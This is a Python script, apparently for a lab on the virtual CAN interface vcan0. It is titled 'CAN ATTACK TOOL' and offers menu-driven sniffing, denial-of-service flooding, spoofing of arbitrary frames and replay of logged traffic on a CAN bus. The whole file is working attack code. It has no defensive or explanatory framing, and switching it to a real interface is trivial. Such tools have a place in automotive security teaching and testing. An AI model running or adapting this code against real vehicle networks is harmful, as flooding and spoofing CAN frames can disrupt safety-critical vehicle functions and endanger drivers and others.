#!/usr/bin/env python3
import can
import time
import binascii
from datetime import datetime

# ================================================================
#                         S N I F F I N G
# ================================================================

def sniff_can():
    print("=== CAN Bus Sniffer (vcan0) ===")
    
    # Get user input
    filter_id = input("Enter CAN ID to sniff (hex, example 0x100 or 'all'): ").strip()
    try:
        sniff_time = float(input("Enter sniff duration in seconds: ").strip())
    except ValueError:
        print("Invalid duration. Aborting.")
        return
    
    # Prepare CAN bus
    try:
        bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    except Exception as e:
        print("Error opening CAN interface:", e)
        return

    # Log file name with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = f"sniff_log_{timestamp}.txt"
    
    print(f"\nSniffing started... Logging into {logfile}\n")

    start_time = time.time()

    # Open log file
    try:
        with open(logfile, "w") as f:
            while time.time() - start_time < sniff_time:
                msg = bus.recv(0.1)   # timeout 100ms
                
                if msg is None:
                    continue
                
                # If user chose specific ID
                if filter_id.lower() != "all":
                    try:
                        wanted_id = int(filter_id, 16)
                        if msg.arbitration_id != wanted_id:
                            continue
                    except Exception:
                        print("Invalid ID format. Use hex like 0x100.")
                        return

                # Format CAN frame
                log_line = f"{hex(msg.arbitration_id)} [{msg.dlc}] {msg.data.hex()}"
                
                # Print on screen
                print("[SNIFF]", log_line)
                
                # Save into file
                f.write(log_line + "\n")

    except Exception as e:
        print("Error writing log file:", e)
        return

    print("\n=== Sniffing Complete ===")
    print(f"Saved log file: {logfile}")


# ================================================================
#                         D O S   A T T A C K
# ================================================================

def dos_attack(can_id: int, interval: float):
    try:
        bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    except Exception as e:
        print("Error opening CAN interface:", e)
        return

    print("\n STARTING DoS ATTACK ")
    print(f"Flooding CAN ID 0x{can_id:X} every {interval} seconds...\n")

    data = bytes([0xFF] * 8)  # 8-byte payload fully filled

    try:
        while True:
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            bus.send(msg)

            print(f"[DoS] Sent frame → ID=0x{can_id:X} Data={data.hex()}")
            # If interval is zero or very small, throttle a little to avoid hogging CPU
            if interval <= 0:
                time.sleep(0.001)
            else:
                time.sleep(interval)

    except KeyboardInterrupt:
        print("\n DoS attack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")


# ================================================================
#                         S P O O F I N G
# ================================================================
CAN_IFACE = "vcan0"

def hex_to_bytes(hex_string):
    """Convert hex string like '11 22 33' into bytes."""
    hex_string = hex_string.replace(" ", "").replace("0x", "")
    return bytes.fromhex(hex_string)

def spoofing_attack():
    print("=== SPOOFING ATTACK ===")
    
    # 1. Ask for CAN ID
    user_can_id = input("Enter CAN ID to spoof (hex, example 200): ").strip()
    try:
        can_id = int(user_can_id, 16)
    except:
        print("Invalid CAN ID!")
        return
    
    # 2. Ask for fake data
    fake_data_hex = input("Enter fake data bytes (hex, example '11 22 33 44 55 66 77 88'): ").strip()
    try:
        fake_data = hex_to_bytes(fake_data_hex)
    except Exception:
        print("Invalid data format!")
        return
    
    if len(fake_data) > 8:
        print("CAN classic max 8 bytes!")
        return
    
    # 3. Attack frequency
    try:
        delay = float(input("Send how often? (seconds, example 0.1): ").strip())
    except ValueError:
        print("Invalid interval.")
        return

    # Create CAN bus
    try:
        bus = can.interface.Bus(channel=CAN_IFACE, bustype='socketcan')
    except Exception as e:
        print("Error opening CAN interface:", e)
        return

    print(f"\n SPOOFING started on ID 0x{can_id:X} sending every {delay}s")
    print(f"Fake DATA = {fake_data.hex()}\n")

    # 4. Inject forever
    try:
        while True:
            msg = can.Message(arbitration_id=can_id, data=fake_data, is_extended_id=False)
            bus.send(msg)
            print(f"[SPOOFED] ID=0x{can_id:X} DATA={fake_data.hex()}")
            if delay <= 0:
                time.sleep(0.001)
            else:
                time.sleep(delay)

    except KeyboardInterrupt:
        print("\nStopping spoofing attack.")
        print("[OK] Bus closed.")
    except Exception as e:
        print("Error in spoofing:", e)


# ================================================================
#                         R E P L A Y
# ================================================================

def replay_attack():
    print("=== CAN Bus Replay Attack ===")

    # --- 1. Choose the log file ---
    log_file = input("Enter sniff log filename (example: sniff_log_20251118_220501.txt): ").strip()

    try:
        with open(log_file, "r") as f:
            lines = f.readlines()
    except FileNotFoundError:
        print("ERROR: File not found.")
        return
    except Exception as e:
        print("Error opening file:", e)
        return

    print(f"\nLoaded {len(lines)} frames from log file.")
    print("Starting replay...\n")

    # --- 2. Setup CAN Bus ---
    try:
        bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    except Exception as e:
        print("Error opening CAN interface:", e)
        return

    # --- 3. Re-send each frame ---
    for line in lines:
        try:
            # Example line format:
            # 0x200 [8] 31 01 02 32 35 2e 30 00

            parts = line.strip().split()

            if len(parts) < 3:
                print("Skipping malformed line:", line)
                continue

            can_id = int(parts[0], 16)      # e.g. 0x200
            dlc = int(parts[1].strip('[]')) # [8] → 8
            data_hex = parts[2:]            # list of hex byte strings

            # Some logs might have bytes without spaces; handle both
            if len(data_hex) == 1 and len(data_hex[0]) == dlc * 2:
                data_bytes = bytes.fromhex(data_hex[0])
            else:
                data_bytes = bytes.fromhex("".join(data_hex))

            msg = can.Message(
                arbitration_id=can_id,
                data=data_bytes,
                is_extended_id=False
            )

            # Send the frame
            bus.send(msg)
            print(f"[REPLAY] Sent ID={hex(can_id)} Data={data_bytes.hex()}")

            # Optional delay (mimic real timing)
            time.sleep(0.02)

        except Exception as e:
            print("Error parsing line:", line)
            print("Details:", e)

    print("\n=== Replay Complete ===")


# ================================================================
#                           MENU
# ================================================================
def main_menu():
    while True:
        print("\n========================================")
        print("              CAN ATTACK TOOL")
        print("========================================")
        print("[1] Sniffing")
        print("[2] DoS Attack (flood bus)")
        print("[3] Spoofing Attack")
        print("[4] Replay Attack")
        print("[0] Exit")
        print("========================================")

        choice = input("Choose option: ").strip()

        if choice == "1":
            sniff_can()
        elif choice == "2":
            cid = input("Enter CAN ID to flood (hex): ").strip()
            try:
                cid_int = int(cid, 16)
            except:
                print("Invalid CAN ID. Example: 0x200 or 200")
                continue
            interval = input("Enter interval between frames (seconds, 0 for max speed): ").strip()
            try:
                interval_f = float(interval)
            except:
                print("Invalid interval.")
                continue
            dos_attack(cid_int, interval_f)
        elif choice == "3":
            spoofing_attack()
        elif choice == "4":
            replay_attack()
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Try again.")


if __name__ == "__main__":
    main_menu()
